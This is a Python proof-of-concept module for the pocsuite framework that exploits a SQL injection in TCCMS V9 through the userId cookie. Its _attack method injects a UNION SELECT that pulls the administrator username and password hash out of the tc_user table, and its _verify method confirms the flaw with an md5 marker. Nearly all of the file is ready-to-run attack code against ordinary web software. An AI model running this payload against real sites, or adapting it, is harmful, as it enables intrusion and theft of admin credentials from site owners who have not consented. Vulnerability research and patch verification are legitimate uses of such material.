#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
from pocsuite.lib.core.data import logger
from pocsuite.lib.core.enums import CUSTOM_LOGGING
import re
import urlparse


class TestPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['Gump']
    vulDate = '2015-07-25'
    createDate = '2016-01-23'
    updateDate = '2016-01-23'
    references = ['http://www.wooyun.org/bugs/wooyun-2015-0107593']
    name = 'TCCMS V9 app/controller/news.class.php SQL注入 POC'
    appPowerLink = 'http://www.teamcen.com/'
    appName = 'TCCMS'
    appVersion = '9.0'
    vulType = 'SQL Injection'
    desc = '''
    TCCMS在拼接where语句的时候过滤不严，导致参数直接拼接到sql语句中产生注入，可以获得管理员账户和加密后的密码。这里用cookie里的参数来测试。
    '''
    samples = ['']
    
    # 组件下载地址：http://down.chinaz.com/soft/33822.htm
    def check_argv(self):
        logger.log(CUSTOM_LOGGING.WARNING,u"注意，需要登录后的cookie,cookie例子:PHPSESSID=xxx; userId=1; AuthenId=xxx")
        if self.headers['Cookie']:
            if re.search('(userId=\d+)',self.headers['Cookie']):
                return True
            else:
                logger.log(CUSTOM_LOGGING.WARNING,u"输入的cookie不正确")
                return False
        else:
            logger.log(CUSTOM_LOGGING.WARNING,u"请提交登录后的cookie")
            return False

    def _attack(self):
        if self.check_argv():
            result = {}
            payload = re.sub(r'(userId=\d+)','\\1'+' union select concat(char(45,45,45),username,char(45,45,45),password,char(45,45,45)),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 from tc_user limit 1#',self.headers['Cookie'])
            self.headers['Cookie'] = payload
            vul_url = urlparse.urljoin(self.url,'index.php?ac=news_all&showSql=1&type=user')
            resp = req.get(vul_url)
            if resp.status_code == 200:
                match_result = re.search(r'\(\'---(.+)---(.+)---\'\)',resp.content,re.I | re.M)
                if match_result:
                    result['AdminInfo'] = {}
                    result['AdminInfo']['Username'] = match_result.group(1)
                    result['AdminInfo']['Password'] = match_result.group(2)
            return self.parse_attack(result)

    def _verify(self):
        if self.check_argv():
            result = {}
            payload = re.sub(r'(userId=\d+)','\\1'+' union select concat(floor(rand(0)*2),md5(1)),2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#',self.headers['Cookie'])
            self.headers['Cookie'] = payload
            vul_url = urlparse.urljoin(self.url,'index.php?ac=news_all&showSql=1&type=user')
            resp = req.get(vul_url)
            if resp.status_code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in resp.content:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_url
                result['VerifyInfo']['Payload'] = payload
            return self.parse_attack(result)

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)